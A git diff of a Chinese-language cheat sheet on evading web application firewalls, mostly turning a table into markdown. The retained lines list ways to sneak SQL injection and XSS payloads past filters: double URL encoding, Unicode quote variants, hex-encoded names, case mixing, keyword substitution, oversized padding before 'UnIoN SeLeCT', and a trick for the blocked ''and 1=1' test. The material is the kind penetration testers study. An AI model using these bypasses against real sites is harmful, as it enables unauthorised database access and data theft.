@@ -43,12 +43,13 @@ where table_schema='security' /*!12441and*/ table_name='users' -- 1\
 
 ---
 
-方法                                                                 payload
-编码                                      1、进行url编码（少数waf不会进行URL解码,部分waf进行一次url解码==>可对payload进行二次url编码）
-                                          2、Unicode编码：单引号 = %u0027、%u02b9、%u02bc
-                                          3、部分十六进制编码：adminuser = 0x61646D696E75736572
-                                          4、SQL编码：unicode、HEX、URL、ascll、base64等
-                                          5、XSS编码：HTML、URL、ASCII、JS编码、base64等
+| 方法 |                                                                | payload |
+|--------------------------------------|--------------------------------------------------------------------------------|
+| 编码 |                                | 1、进行url编码（少数waf不会进行URL解码,部分waf进行一次url解码==>可对payload进行二次url编码）|
+                                        | 2、Unicode编码：单引号 = %u0027、%u02b9、%u02bc |
+                                        | 3、部分十六进制编码：adminuser = 0x61646D696E75736572 |
+                                        | 4、SQL编码：unicode、HEX、URL、ascll、base64等 |
+                                        | 5、XSS编码：HTML、URL、ASCII、JS编码、base64等 |
 大小写变换                                 select=SELecT
 关键字替换                                 And = &&
                                           Or = ||
@@ -85,7 +86,9 @@ http协议绕过                              Content-Type绕过：application/x
  Waf检测限制绕过                          参数溢出
                                          缓冲区溢出：
                                          UnIoN SeLeCT ===》 and (select 1)=(Select 0xA*99999) UnIoN SeLeCT and 1=1 ===》 and 1=1 and 99…99999 //此处省略N多个9同网段/ssrf绕过                                       
-------------------------------------------------------------------------------------------------------
+
+---
+
 1=1绕过\
 'and 1=1-- -被拦截\
 &符号可以绕\
